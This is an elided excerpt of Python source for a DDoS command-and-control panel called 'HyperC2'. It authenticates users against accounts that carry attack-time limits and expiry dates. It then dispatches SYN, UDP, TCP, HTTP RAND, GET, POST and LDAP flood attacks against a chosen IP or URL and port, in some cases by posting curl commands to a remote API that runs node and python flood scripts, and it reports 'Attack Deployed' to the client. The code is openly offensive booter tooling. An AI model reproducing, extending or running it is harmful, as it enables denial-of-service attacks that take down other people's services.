...
def find_login(username, password):
    ...
    for x in credentials:
        try:
            c_username, c_password, max_time_str, expiry_date_str = x.split(':')
        ...
        try:
                        ...
                        if validate_port(port):
                            if validate_time(secs):
                                ...
                                if attack_time <= max_time:
                                    ...
                                    subprocess.run(command, shell=True)
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Status        ►► {Fore.LIGHTBLACK_EX}Attack Deployed{Fore.LIGHTWHITE_EX}')           
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Method        ►► {Fore.LIGHTBLACK_EX}SYN{Fore.LIGHTWHITE_EX}')                                                      
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Host          ►► {Fore.LIGHTBLACK_EX}{ip}{Fore.LIGHTWHITE_EX}')                                            
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Port          ►► {Fore.LIGHTBLACK_EX}{port}{Fore.LIGHTWHITE_EX}')                              
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Time          ►► {Fore.LIGHTBLACK_EX}{secs}{Fore.LIGHTWHITE_EX}')
                                else:
                        ...
                        if validate_port(port):
                            if validate_time(secs):
                                ...
                                if attack_time <= max_time:
                                    ...
                                    subprocess.run(command, shell=True)
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Status        ►► {Fore.LIGHTBLACK_EX}Attack Deployed{Fore.LIGHTWHITE_EX}')           
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Method        ►► {Fore.LIGHTBLACK_EX}UDP{Fore.LIGHTWHITE_EX}')                                                      
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Host          ►► {Fore.LIGHTBLACK_EX}{ip}{Fore.LIGHTWHITE_EX}')                                            
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Port          ►► {Fore.LIGHTBLACK_EX}{port}{Fore.LIGHTWHITE_EX}')                              
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Time          ►► {Fore.LIGHTBLACK_EX}{secs}{Fore.LIGHTWHITE_EX}')
                                else:
            ...
            # TCP junk data packets flood
                        ...
                        if validate_port(port):
                            if validate_time(secs):
                                ...
                                if attack_time <= max_time:
                                    ...
                                    subprocess.run(command, shell=True)
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Status        ►► {Fore.LIGHTBLACK_EX}Attack Deployed{Fore.LIGHTWHITE_EX}')           
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Method        ►► {Fore.LIGHTBLACK_EX}TCP{Fore.LIGHTWHITE_EX}')                                                      
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Host          ►► {Fore.LIGHTBLACK_EX}{ip}{Fore.LIGHTWHITE_EX}')                                            
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Port          ►► {Fore.LIGHTBLACK_EX}{port}{Fore.LIGHTWHITE_EX}')                              
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Time          ►► {Fore.LIGHTBLACK_EX}{secs}{Fore.LIGHTWHITE_EX}')
                                else:
                ...
                if len(args) == 4:
                    ...
                    if validate_port(port):
                        if validate_port(port):
                            if validate_time(secs):
                                attack_time = int(secs)
                                if attack_time <= max_time:
                                    command = f'curl --silent -X POST -H "Content-Type: application/json" -d "{{\\"command\\":\\"node HTTP-RAND.js {ip} {secs}\\"}}" {api}'
                                    subprocess.run(command, shell=True)
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Status        ►► {Fore.LIGHTBLACK_EX}Attack Deployed{Fore.LIGHTWHITE_EX}')           
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Method        ►► {Fore.LIGHTBLACK_EX}RAND{Fore.LIGHTWHITE_EX}')                                                      
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Host          ►► {Fore.LIGHTBLACK_EX}{ip}{Fore.LIGHTWHITE_EX}')                                            
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Port          ►► {Fore.LIGHTBLACK_EX}{port}{Fore.LIGHTWHITE_EX}')                              
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Time          ►► {Fore.LIGHTBLACK_EX}{secs}{Fore.LIGHTWHITE_EX}')
                                else:
                    ...
                    send(client, 'Usage: .rand [URL] [PORT] [TIME]')
            elif command == '.GET':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    ...
                    if validate_port(port):
                        if validate_port(port):
                            if validate_time(secs):
                                attack_time = int(secs)
                                if attack_time <= max_time:
                                    command = f'curl --silent -X POST -H "Content-Type: application/json" -d "{{\\"command\\":\\"python3 get.py {ip} {secs} {port}\\"}}" {api}'
                                    subprocess.run(command, shell=True)
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Status        ►► {Fore.LIGHTBLACK_EX}Attack Deployed{Fore.LIGHTWHITE_EX}')           
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Method        ►► {Fore.LIGHTBLACK_EX}DNS{Fore.LIGHTWHITE_EX}')                                                      
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Host          ►► {Fore.LIGHTBLACK_EX}{ip}{Fore.LIGHTWHITE_EX}')                                            
                    ...
                    send(client, 'Usage: .get [URL] [PORT] [TIME]')
            elif command == '.POST':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    ...
                    if validate_port(port):
                        if validate_port(port):
                            if validate_time(secs):
                                attack_time = int(secs)
                                if attack_time <= max_time:
                                    command = f'curl --silent -X POST -H "Content-Type: application/json" -d "{{\\"command\\":\\"python3 post.py {ip} {secs} {port}\\"}}" {api}'
                                    subprocess.run(command, shell=True)
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Status        ►► {Fore.LIGHTBLACK_EX}Attack Deployed{Fore.LIGHTWHITE_EX}')           
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Method        ►► {Fore.LIGHTBLACK_EX}POST{Fore.LIGHTWHITE_EX}')                                                      
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Host          ►► {Fore.LIGHTBLACK_EX}{ip}{Fore.LIGHTWHITE_EX}')                                            
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Port          ►► {Fore.LIGHTBLACK_EX}{port}{Fore.LIGHTWHITE_EX}')                              
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Time          ►► {Fore.LIGHTBLACK_EX}{secs}{Fore.LIGHTWHITE_EX}')
                                else:
                    ...
                    send(client, 'Usage: .post [URL] [PORT] [TIME]')
            elif command == '.LDAP':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                        ...
                        if validate_port(port):
                            if validate_time(secs):
                                ...
                                if attack_time <= max_time:
                                    ...
                                    subprocess.run(command, shell=True)
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Status        ►► {Fore.LIGHTBLACK_EX}Attack Deployed{Fore.LIGHTWHITE_EX}')           
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Method        ►► {Fore.LIGHTBLACK_EX}LDAP{Fore.LIGHTWHITE_EX}')                                                      
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Host          ►► {Fore.LIGHTBLACK_EX}{ip}{Fore.LIGHTWHITE_EX}')                                            
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Port          ►► {Fore.LIGHTBLACK_EX}{port}{Fore.LIGHTWHITE_EX}')                              
                                    send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Time          ►► {Fore.LIGHTBLACK_EX}{secs}{Fore.LIGHTWHITE_EX}')
                                else:
...
# During command processing or in a separate thread
def check_session_timeout(max_time_seconds):
    while True:
        current_time = datetime.now()
        elapsed_time = (current_time - login_start_time).total_seconds()
        if elapsed_time > max_time_seconds:
            send(client, Fore.RED + 'Session expired')
            client.close()
            return
        time.sleep(60)  # Check every minute

def handle_client(client, address):
    send(client, f'\33]0;HyperC2 | Login\a', False)
